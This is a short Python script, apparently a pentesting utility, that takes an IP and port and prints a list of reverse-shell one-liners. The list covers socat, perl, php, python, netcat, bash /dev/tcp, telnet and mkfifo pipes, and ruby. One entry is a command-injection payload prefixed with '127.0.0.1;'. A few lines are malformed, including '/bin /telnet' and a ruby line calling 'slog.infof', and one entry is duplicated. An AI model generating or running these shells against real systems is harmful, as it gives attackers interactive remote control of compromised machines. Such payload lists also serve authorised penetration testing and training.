#!/usr/bin/python

import sys
import socket

# Uso
if len(sys.argv) != 3:
    print("[!] usage: "+sys.argv[0]+" <IP> <PORT>")
    sys.exit(1)

# Variables
ipDst = sys.argv[1]
portDst = int(sys.argv[2])

try:
    if 1 <= portDst <= 65535:
        pass
    else:
        raise ValueError
except ValueError:
    print("[!] Invalid Port")
    sys.exit(2)

# Validacion
try:
	socket.inet_aton(ipDst)
except socket.error:
	print("[!] Invalid IP")
	sys.exit(2)

# Lista de shells
a = "socat TCP4:%s:%s EXEC:bash,pty,stderr,setsid,sigint,sane" %(ipDst,portDst)
b = "perl -e 'use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" %(ipDst,portDst)
c = "php -r '$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" %(ipDst,portDst)
d = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" %(ipDst,portDst)
e = "nc -e /bin/sh %s %s" %(ipDst,portDst)
f = "bash -i >& /dev/tcp/%s/%s 0>&1" %(ipDst,portDst)
g = "127.0.0.1;bash -i >& /dev/tcp/%s/%s 0>&1" %(ipDst,portDst)
h = "/bin /telnet %s 80 | /bin/bash | /bin/telnet %s 25" %(ipDst,portDst)
i = "mknod backpipe p && telnet %s %s 0<backpipe | /bin/bash 1>backpipe" %(ipDst,portDst)
l = "mknod /var/tmp/fgp p ; /bin/sh 0</var/tmp/fgp |nc %s %s 1>/var/tmp/fgp" %(ipDst,portDst)
m = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f " %(ipDst,portDst)
n = "ruby -rsocket -e'f=TCPSocket.open(\"%s\",%s).to_i;exec slog.infof(\"/bin/sh -i <&%%d >&%%d 2>&%%d\",f,f,f)'" %(ipDst,portDst)
o = "exec 5<>/dev/tcp/%s/%s; while read line 0<&5; do $line 2>&5 >&5; done" %(ipDst,portDst)
p = "mknod /var/tmp/fgp p ; /bin/sh 0</var/tmp/fgp |nc %s %s 1>/var/tmp/fgp" %(ipDst,portDst)


# Printer
print("******** Reverse Shells *******\n")
for line in (a,b,c,d,e,f,g,h,i,l,m,n,o,p):
	print("[\033[1;34m*\033[0m] "+line)
